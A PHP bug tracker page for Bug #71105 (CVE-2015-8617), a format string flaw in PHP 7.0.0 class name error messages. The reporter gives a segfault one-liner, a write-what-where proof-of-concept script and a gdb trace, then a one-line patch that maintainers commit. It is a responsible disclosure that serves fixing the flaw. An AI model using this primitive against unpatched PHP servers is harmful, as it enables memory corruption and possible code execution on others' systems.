<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
        <link rel='alternate' type='application/rss+xml' title='Scripting Engine problem Bug #71105 - RDF' href='rss/bug.php?id=71105'>
        <link rel='alternate' type='application/rss+xml' title='Scripting Engine problem Bug #71105 - RSS 2.0' href='rss/bug.php?id=71105&format=rss2'>
        <base href="https://bugs.php.net/">
    <title>PHP :: Bug #71105 :: Format String Vulnerability in Class Name Error Message</title>
    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
</head>

<body>

<table id="top" class="head" cellspacing="0" cellpadding="0">
    <tr>
        <td class="head-logo">
            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
        </td>

        <td class="head-menu">
            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
            <a href="random">random bug</a>&nbsp;|&nbsp;
            <a href="login.php">login</a>
        </td>
    </tr>

    <tr>
        <td class="head-search" colspan="2">
            <form method="get" action="search.php">
                <p class="head-search">
                    <input type="hidden" name="cmd" value="display">
                    <small>go to bug id or search bugs for</small>
                    <input class="small" type="text" name="search_for" value="" size="30">
                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
                </p>
            </form>
        </td>
    </tr>
</table>

<table class="middle" cellspacing="0" cellpadding="0">
    <tr>
        <td class="content">
<div id="bugheader">
    <table id="details">
        <tr id="title">
            <th class="details" id="number"><a href="bug.php?id=71105">Bug</a>&nbsp;#71105</th>
            <td id="summary" colspan="5">Format String Vulnerability in Class Name Error Message</td>
        </tr>
        <tr id="submission">
            <th class="details">Submitted:</th>
            <td style="white-space: nowrap;">2015-12-12 18:35 UTC</td>
            <th class="details">Modified:</th>
            <td style="white-space: nowrap;">2015-12-27 14:33 UTC</td>
            <td rowspan="6">


            </td>
        </tr>

        <tr id="submitter">
            <th class="details">From:</th>
            <td>andrew &#x61;&#116; jmpesp &#x64;&#111;&#x74; org</td>
            <th class="details">Assigned:</th>
            <td><a href="search.php?cmd=display&amp;assign=ab">ab</a> (<a href="https://people.php.net/ab">profile</a>)</td>
        </tr>

        <tr id="categorization">
            <th class="details">Status:</th>
            <td>Closed</td>
            <th class="details">Package:</th>
            <td><a href="search.php?cmd=display&amp;package_name[]=Scripting+Engine+problem">Scripting Engine problem</a></td>
        </tr>

        <tr id="situation">
            <th class="details">PHP Version:</th>
            <td>7.0.0</td>
            <th class="details">OS:</th>
            <td>Linux</td>
        </tr>

        <tr id="private">
            <th class="details">Private report:</th>
            <td>No</td>
            <th class="details">CVE-ID:</th>
            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-8617" target="_blank">2015-8617</a></td>
        </tr>
    </table>
</div>

<div class="controls">
<span id='control_0' class='control active'>View</span>
<span id='control_3' class='control'><a href='bug.php?id=71105&amp;edit=3'>Add Comment</a></span>
<span id='control_1' class='control'><a href='bug.php?id=71105&amp;edit=1'>Developer</a></span>
<span id='control_2' class='control'><a href='bug.php?id=71105&amp;edit=2'>Edit</a></span>
</div>
<div class="clear"></div>



<div class='comment type_comment' ><a name="1449945351">&nbsp;</a><strong>[2015-12-12 18:35 UTC] andrew &#x61;&#116; jmpesp &#x64;&#111;&#x74; org</strong>
<pre class='note'>Description:
------------
A format string vulnerability exists in PHP-7.0.0 due to how non-existent class names are handled.  From my limited research I believe this issue is exploitable for full code execution (see test script below).  This issue does not appear to be present in previous PHP version.  Also note that this is NOT the same issue as #70895 or #70914.

I am not intimately familiar with the code-base, so I can't say with 100% certainty what the cause is or fix should be, but Zend/zend_execute_API.c:221 looks very suspicious (see patch).  Adding a &quot;%s&quot; as the second parameter there seems to fix the issue.


Test script:
---------------
### Simple Example (segfault) ###
&lt;?php $name=&quot;%n%n%n&quot;; $name::doSomething(); ?&gt;


### Write-what-where Example ###
andrew@thinkpad /tmp/php-7.0.0_64 % cat /tmp/test.php
&lt;?php
ini_set(&quot;memory_limit&quot;, &quot;4G&quot;);
$rdx = 0x42424242; // what
$rax = 0x43434343; // where
$name = &quot;%&quot; . ($rdx - 8) . &quot;d&quot; . &quot;%d&quot; . &quot;%n&quot; . str_repeat(&quot;A&quot;, ($rax - 34));
$name::doSomething();
?&gt;

andrew@thinkpad /tmp/php-7.0.0_64 % gdb sapi/cli/php
GNU gdb (GDB) 7.10
Copyright (C) 2015 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;<a href="http://gnu.org/licenses/gpl.html" rel="nofollow">http://gnu.org/licenses/gpl.html</a>&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;
and &quot;show warranty&quot; for details.
This GDB was configured as &quot;x86_64-unknown-linux-gnu&quot;.
Type &quot;show configuration&quot; for configuration details.
For bug reporting instructions, please see:
&lt;<a href="http://www.gnu.org/software/gdb/bugs/" rel="nofollow">http://www.gnu.org/software/gdb/bugs/</a>&gt;.
Find the GDB manual and other documentation resources online at:
&lt;<a href="http://www.gnu.org/software/gdb/documentation/" rel="nofollow">http://www.gnu.org/software/gdb/documentation/</a>&gt;.
For help, type &quot;help&quot;.
Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...
Reading symbols from sapi/cli/php...done.
(gdb) r /tmp/test.php
Starting program: /tmp/php-7.0.0_64/sapi/cli/php /tmp/test64.php
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/usr/lib/libthread_db.so.1&quot;.

Program received signal SIGSEGV, Segmentation fault.
0x0000000000672935 in xbuf_format_converter (xbuf=xbuf@entry=0x7fffffffa610, is_char=is_char@entry=1 '\001', fmt=&lt;optimized out&gt;, ap=0x7fffffffa658)
    at /tmp/php-7.0.0_64/main/spprintf.c:744
744						*(va_arg(ap, int *)) = is_char? (int)((smart_string *)xbuf)-&gt;len : (int)ZSTR_LEN(((smart_str *)xbuf)-&gt;s);
(gdb) i r
rax            0x43434343	1128481603
rbx            0x7fffb2800016	140736188121110
rcx            0x6e	110
rdx            0x42424242	1111638594
rsi            0x7fffffff9db0	140737488330160
rdi            0x7fffffffa658	140737488332376
rbp            0x1	0x1
rsp            0x7fffffff9d50	0x7fffffff9d50
r8             0x7fffffff9db0	140737488330160
r9             0x7fffb2800016	140736188121110
r10            0x0	0
r11            0x0	0
r12            0x20	32
r13            0x7fffffffa610	140737488332304
r14            0x0	0
r15            0x4242423a	1111638586
rip            0x672935	0x672935 &lt;xbuf_format_converter+1845&gt;
eflags         0x10202	[ IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) x/1i $rip
=&gt; 0x672935 &lt;xbuf_format_converter+1845&gt;:	mov    DWORD PTR [rax],edx
(gdb)




</pre>
</div><h2>Patches</h2>
<a href="patch-display.php?bug_id=71105&amp;patch=Hack&amp;revision=latest" >Hack</a>
(last revision 2017-09-11 22:40 UTC by truelovestar88 &#x61;&#116; gmail &#x64;&#111;&#x74; com)
<br><p><a href='patch-add.php?bug_id=71105'>Add a Patch</a></p><h2>Pull Requests</h2>
<p><a href='gh-pull-add.php?bug_id=71105'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
            <div id='comments_view' style='clear:both;'>
<div class='comment type_comment' ><a name="1449946968">&nbsp;</a><strong>[2015-12-12 19:02 UTC] andrew &#x61;&#116; jmpesp &#x64;&#111;&#x74; org</strong>
<pre class='note'>UPDATE:
It seems I'm not able to attach patches when the bug is still private, but here's my proposed fix...

diff -rup php-7.0.0_old/Zend/zend_execute_API.c php-7.0.0_new/Zend/zend_execute_API.c
--- php-7.0.0_old/Zend/zend_execute_API.c	2015-12-01 07:36:25.000000000 -0600
+++ php-7.0.0_new/Zend/zend_execute_API.c	2015-12-12 12:24:24.999391117 -0600
@@ -218,7 +218,7 @@ static void zend_throw_or_error(int fetc
 	zend_vspprintf(&amp;message, 0, format, va);
 
 	if (fetch_type &amp; ZEND_FETCH_CLASS_EXCEPTION) {
-		zend_throw_error(exception_ce, message);
+		zend_throw_error(exception_ce, &quot;%s&quot;, message);
 	} else {
 		zend_error(E_ERROR, &quot;%s&quot;, message);
 	}
</pre>
</div><div class='comment type_log' ><a name="1449974917">&nbsp;</a><strong>[2015-12-13 02:48 UTC] <a href="//people.php.net/laruence">laruence@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Assigned To:</span>
<span class="added">+Assigned To: ab</span>
</div></div></div><div class='comment type_comment' ><a name="1449974917">&nbsp;</a><strong>[2015-12-13 02:48 UTC] <a href="//people.php.net/laruence">laruence@php.net</a></strong>
<pre class='note'>the patch has been pushed in : <a href="https://github.com/php/php-src/commit/b101a6bbd4f2181c360bd38e7683df4a03cba83e" rel="nofollow">https://github.com/php/php-src/commit/b101a6bbd4f2181c360bd38e7683df4a03cba83e</a>

since this is a security fix, I will not add the NEWs entry and test now..

assign to RM, please add the news entry while doing release:

Fixed <a href='bug.php?id=71105'>bug #71105</a> (Format String Vulnerability in Class Name Error Message). (andrew at jmpesp dot org)
</pre>
</div><div class='comment type_related' ><a name="1449974920">&nbsp;</a><strong>[2015-12-13 02:48 UTC] <a href="//people.php.net/laruence">laruence@php.net</a></strong>
<pre class='note'>Related To: <a href='bug.php?id=71105'>Bug #71105</a>
</pre>
</div><div class='comment type_log' ><a name="1449976655">&nbsp;</a><strong>[2015-12-13 03:17 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Type: Security</span>
<span class="added">+Type: Bug</span>
</div></div></div><div class='comment type_log' ><a name="1449976740">&nbsp;</a><strong>[2015-12-13 03:19 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Assigned</span>
<span class="added">+Status: Closed</span>
</div></div></div><div class='comment type_comment' ><a name="1449976740">&nbsp;</a><strong>[2015-12-13 03:19 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>The fix for this bug has been committed.

Snapshots of the sources are packaged every three hours; this change
will be in the next snapshot. You can grab the snapshot at
<a href="http://snaps.php.net/" rel="nofollow">http://snaps.php.net/</a>.

 For Windows:

<a href="http://windows.php.net/snapshots/" rel="nofollow">http://windows.php.net/snapshots/</a>
 
Thank you for the report, and for helping us make PHP better.


</pre>
</div><div class='comment type_log' ><a name="1449982954">&nbsp;</a><strong>[2015-12-13 05:02 UTC] <a href="//people.php.net/laruence">laruence@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Type: Bug</span>
<span class="added">+Type: Security</span>
</div></div></div><div class='comment type_log' ><a name="1449993069">&nbsp;</a><strong>[2015-12-13 07:51 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Type: Security</span>
<span class="added">+Type: Bug</span>
</div></div></div><div class='comment type_log' ><a name="1451226800">&nbsp;</a><strong>[2015-12-27 14:33 UTC] <a href="//people.php.net/kaplan">kaplan@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-CVE-ID:</span>
<span class="added">+CVE-ID: 2015-8617</span>
</div></div></div></div>
        </td>
    </tr>
</table>

<script src='js/util.js'></script>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
<script src="js/jquery.cookie.js"></script>
<script>
function do_comment(nd)
{
    $('#comment_filter > .control.active').removeClass("active");
    $(nd).addClass("active");

    $.cookie('history_tab', nd.id, { expires: 365 });

    if (nd.id == 'type_all') {
        $('#comments_view > .comment:hidden').show('slow');
    } else {
        $('#comments_view > .comment').each(function(i) {
            if ($(this).hasClass(nd.id)) {
                $(this).show('slow');
            } else {
                $(this).hide('slow');
            }
        });
    }
    return false;
}
</script>
<table class="foot" cellspacing="0" cellpadding="0">
    <tr>
        <td class="foot-bar" colspan="2">&nbsp;</td>
    </tr>

    <tr>
        <td class="foot-copy">
            <small>
                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
                All rights reserved.
            </small>
        </td>
        <td class="foot-source">
            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
        </td>
    </tr>
</table>
</body>
</html>
